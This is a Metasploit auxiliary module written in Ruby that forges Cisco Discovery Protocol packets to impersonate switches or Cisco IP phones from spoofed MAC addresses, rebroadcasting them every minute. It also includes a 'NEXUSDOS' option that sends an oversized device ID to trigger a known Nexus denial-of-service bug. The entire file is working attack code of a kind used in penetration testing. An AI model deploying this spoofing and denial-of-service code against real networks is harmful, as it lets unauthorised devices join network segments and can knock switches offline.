require 'msf/core'

# tested on BT 5 MSF SVN version: 12900, 12963, 13473
# pcaprub must be installed

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Capture

	def initialize(info = {})
		super(
			'Name'			=> 'Forge Cisco CDP Packets',
			'Description'    => %q{
				This module forges Cisco Discovery Protocol packets
				to setup fake devices.  NEXUSDOS exploits the CDP
				bug by setting a long device ID, it is identified
				by Cisco bug ID CSCtf08873.
			},
			'Author'	=> 
				[
					'Spencer McIntyre',
					'SecureState R&D Team'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9 $',
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' => [ 'Service' ],
			'DefaultAction'  => 'Service'
		)
		register_options(
			[
				OptBool.new('PHONE', [true, "Imitate a Cisco VoIP Phone", false])
			], self.class)
		register_advanced_options([
			OptString.new('SMAC', [false, 'The spoofed mac']),
			OptString.new('DEVICEID', [ true, "Device Identifier", 'switch.example.com']),
			OptString.new('PLATFORM', [ true, "Device Platform", 'cisco WS-C2960-48TC-L']),
			OptString.new('PORTID', [ true, "Device's Directly Attached Interface", 'FastEthernet0/1']),
			OptInt.new('NATIVEVLAN', [ false, "Device's Native VLAN Identifier", 0]),
			OptBool.new('NEXUSDOS', [ false, "Nexus Denial of Service", false]),
		])
		deregister_options('RHOST')
	end

	def build_base_cdp_frame(smac)
		p = PacketFu::EthPacket.new
		p.eth_daddr = '01:00:0c:cc:cc:cc'			# this has to stay the same
		if smac
			p.eth_saddr = smac
		else
			smac = '00:1c:0e'						# following 6 lines make a fake Cisco source MAC address
			3.times do					
				smac << ':'
				smac << (16 + rand(238)).to_s(16)
			end
		end
		raise RuntimeError ,'Source Mac is not in correct format' unless is_mac?(smac)
		p.eth_saddr = smac
		llc_hdr =	"\xaa\xaa\x03\x00\x00\x0c\x20\x00"
		cdp_hdr = 	"\x01"					# version
		p.instance_variable_set(:@cdp_version, 1)
		cdp_hdr << 	"\xff"					# ttl
		p.instance_variable_set(:@cdp_ttl, 255)
		cdp_hdr <<	"\x00\x00"				# checksum
		p.eth_proto = llc_hdr.length + cdp_hdr.length
		p.payload = llc_hdr << cdp_hdr
		p
	end
	
	def checksum(data)
		num_shorts = data.length / 2
		checksum = 0
		count = data.length
		
		data.unpack("S#{num_shorts}").each do |x|
			checksum += x
			count -= 2
		end
		
		if (count == 1)
			checksum += data[data.length - 1].unpack("C")[0]
		end
		
		checksum = (checksum >> 16) + (checksum & 0xffff)
		checksum = ~((checksum >> 16) + checksum) & 0xffff
		[checksum].pack("S*")
	end
	
	def create_tlv(type, value)
		[ type, (value.length + 4) ].pack("nn") << value
	end
	
	def fix_cdp(cdp)	# fix the frame before sending it, compute/set the checksum and update the length
	    pseudo = []
		pseudo << ((cdp.instance_variable_get("@cdp_version") << 8) | cdp.instance_variable_get("@cdp_ttl"))
		pseudo << 0
		pseudo << cdp.payload[12..-1]	# len(llc_hdr) + len(cdp_hdr)
		
		cdp.payload[10..11] = checksum(pseudo.pack("nna*"))
		cdp.eth_proto = cdp.payload.length
		cdp
	end
	
	def is_mac?(mac)
		if mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/ then true
		else false end
	end

	def run
		open_pcap({'FILTER' => "ether host 01:00:0c:cc:cc:cc"})
		netifaces = true
		if not netifaces_implemented? 
			print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
			netifaces = false
		end
		@interface = datastore['INTERFACE'] || Pcap.lookupdev
		cdp = build_base_cdp_frame(datastore['SMAC'])
		
		# add TLVs as appropriate
		if datastore['PHONE']
			if datastore['NEXUSDOS']
				cdp.payload << create_tlv(0x0001, "A" * 300)
			else
				cdp.payload << create_tlv(0x0001, "SEP001BD5124D6")
			end
			cdp.payload << create_tlv(0x0003, "Port 1")
			cdp.payload << create_tlv(0x0004, "\x00\x00\x04\x90")
			cdp.payload << create_tlv(0x0005, "SCCP41.8-4-3S")
			cdp.payload << create_tlv(0x0006, "Cisco IP Phone 7941")
			cdp.payload << create_tlv(0x001c, "\x00\x02\x00")
			cdp.payload << create_tlv(0x0019, "\x4d\x6b\x00\x00\x00\x00\x00\x00")
			cdp.payload << create_tlv(0x000f, "\x20\x02\x00\x01")
			cdp.payload << create_tlv(0x000b, "\x01")
			cdp.payload << create_tlv(0x0010, "\x00\x00")
		else
			if datastore['NEXUSDOS']
				cdp.payload << create_tlv(0x0001, "A" * 300)
			else
				cdp.payload << create_tlv(0x0001, datastore['DEVICEID'])
			end
			cdp.payload << create_tlv(0x0003, datastore['PORTID'])
			cdp.payload << create_tlv(0x0004, "\x00\x00\x00\x28")
			cdp.payload << create_tlv(0x0005, "Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(46)SE, RELEASE SOFTWARE (fc2)\nCopyright (c) 1986-2008 by Cisco Systems, Inc.\nCompiled Mon 14-Jun-10 15:59 by Spencer McIntyre")
			cdp.payload << create_tlv(0x0006, datastore['PLATFORM'])
			if datastore['NATIVEVLAN'] != 0
				cdp.payload << create_tlv(0x000a, [ datastore['NATIVEVLAN'] ].pack('n'))
			end
		end
		
		fix_cdp(cdp)
		
		@run = true
		while @run
			capture.inject(cdp.to_s)
			select(nil, nil, nil, 60)
		end
		
		close_pcap
	end
end
